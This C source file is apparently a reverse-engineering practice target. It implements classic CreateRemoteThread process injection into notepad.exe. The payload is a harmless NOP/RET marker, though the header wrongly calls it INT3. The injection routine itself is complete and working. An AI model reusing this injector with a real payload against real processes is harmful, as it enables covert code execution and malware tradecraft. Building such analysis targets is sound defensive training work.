/*
 * injector_stub.c — RE target: classic CreateRemoteThread injection pattern
 *
 * Real-world relevance: most basic code injection technique.
 * Identifies target process by name, allocates RWX memory in target,
 * writes a "payload" (here: just a marker buffer), then creates remote thread.
 *
 * Safe: the "payload" is a NOP sled + INT3 — won't do anything useful.
 * Purpose: let the RE agent identify the injection pattern and TTPs.
 *
 * MITRE: T1055.001 — Process Injection: Dynamic-link Library Injection
 *        T1057     — Process Discovery
 */
#include <windows.h>
#include <tlhelp32.h>
#include <stdio.h>
#include <string.h>

/* Target process to inject into (notepad.exe as a safe example) */
static const char TARGET_PROC[] = "notepad.exe";

/* "Payload": NOP sled + RET — completely harmless, just a marker */
static const BYTE PAYLOAD[] = {
    0x90, 0x90, 0x90, 0x90,  /* NOP NOP NOP NOP */
    0x90, 0x90, 0x90, 0x90,  /* NOP NOP NOP NOP */
    0xC3,                     /* RET */
    0xDE, 0xAD, 0xBE, 0xEF   /* marker */
};

static DWORD find_pid(const char *procname) {
    HANDLE snap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (snap == INVALID_HANDLE_VALUE) return 0;

    PROCESSENTRY32 pe = { .dwSize = sizeof(pe) };
    DWORD pid = 0;

    if (Process32First(snap, &pe)) {
        do {
            if (_stricmp(pe.szExeFile, procname) == 0) {
                pid = pe.th32ProcessID;
                break;
            }
        } while (Process32Next(snap, &pe));
    }
    CloseHandle(snap);
    return pid;
}

static int inject(DWORD pid, const BYTE *payload, SIZE_T size) {
    HANDLE hProc = OpenProcess(
        PROCESS_VM_OPERATION | PROCESS_VM_WRITE | PROCESS_CREATE_THREAD,
        FALSE, pid);
    if (!hProc) {
        printf("OpenProcess(%u) failed: %lu\n", pid, GetLastError());
        return 0;
    }

    /* Allocate RWX region in target */
    LPVOID remote_buf = VirtualAllocEx(hProc, NULL, size,
                                        MEM_COMMIT | MEM_RESERVE,
                                        PAGE_EXECUTE_READWRITE);
    if (!remote_buf) {
        printf("VirtualAllocEx failed: %lu\n", GetLastError());
        CloseHandle(hProc);
        return 0;
    }

    /* Write payload */
    SIZE_T written = 0;
    if (!WriteProcessMemory(hProc, remote_buf, payload, size, &written)) {
        printf("WriteProcessMemory failed: %lu\n", GetLastError());
        VirtualFreeEx(hProc, remote_buf, 0, MEM_RELEASE);
        CloseHandle(hProc);
        return 0;
    }

    printf("Injected %zu bytes at %p in PID %u\n", written, remote_buf, pid);

    /* Create remote thread at payload start */
    HANDLE hThread = CreateRemoteThread(hProc, NULL, 0,
                                         (LPTHREAD_START_ROUTINE)remote_buf,
                                         NULL, 0, NULL);
    if (hThread) {
        printf("Remote thread created: handle=%p\n", hThread);
        WaitForSingleObject(hThread, 2000);
        CloseHandle(hThread);
    } else {
        printf("CreateRemoteThread failed: %lu\n", GetLastError());
    }

    VirtualFreeEx(hProc, remote_buf, 0, MEM_RELEASE);
    CloseHandle(hProc);
    return 1;
}

int main(void) {
    printf("=== Injector Stub ===\n");
    printf("Targeting: %s\n", TARGET_PROC);

    DWORD pid = find_pid(TARGET_PROC);
    if (!pid) {
        printf("Process '%s' not found. Injection skipped.\n", TARGET_PROC);
        printf("(Start notepad.exe to test injection)\n");
        return 1;
    }

    printf("Found PID: %u\n", pid);
    inject(pid, PAYLOAD, sizeof(PAYLOAD));
    return 0;
}
